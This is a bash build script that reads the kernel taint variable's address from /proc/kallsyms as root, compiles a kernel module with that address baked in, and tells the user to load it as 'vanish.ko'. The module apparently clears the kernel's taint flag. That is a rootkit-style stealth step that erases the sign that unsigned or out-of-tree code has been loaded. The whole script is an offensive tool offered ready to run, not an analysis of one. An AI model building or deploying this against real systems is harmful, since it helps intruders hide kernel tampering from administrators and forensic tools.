#!/bin/bash

# Check for root (needed to read /proc/kallsyms)
if [ "$EUID" -ne 0 ]; then 
  echo "[-] Please run as root (sudo)."
  exit 1
fi

echo "[*] Hunting for taint symbol..."

# Different kernels name the variable differently. We check both.
# 1. Try 'tainted_mask' (Common in newer kernels/Kali)
ADDR=$(grep -w "tainted_mask" /proc/kallsyms | awk '{print "0x"$1}')

# 2. If not found, try 'tainted' (Older kernels)
if [ -z "$ADDR" ]; then
    ADDR=$(grep -w "tainted" /proc/kallsyms | awk '{print "0x"$1}')
fi

if [ -z "$ADDR" ]; then
    echo "[-] CRITICAL: Could not find taint address in kallsyms."
    echo "    Check if 'kernel.kptr_restrict' is set to 2."
    exit 1
fi

echo "[+] Target Acquired: $ADDR"

# Clean previous builds
make -C /lib/modules/$(uname -r)/build M=$PWD clean > /dev/null

# Compile, injecting the address as a macro constant
echo "[*] Compiling module..."
make -C /lib/modules/$(uname -r)/build M=$PWD KCPPFLAGS="-DTAINT_ADDR=$ADDR" modules

echo "[+] Build complete."
echo "    Run: sudo insmod vanish.ko"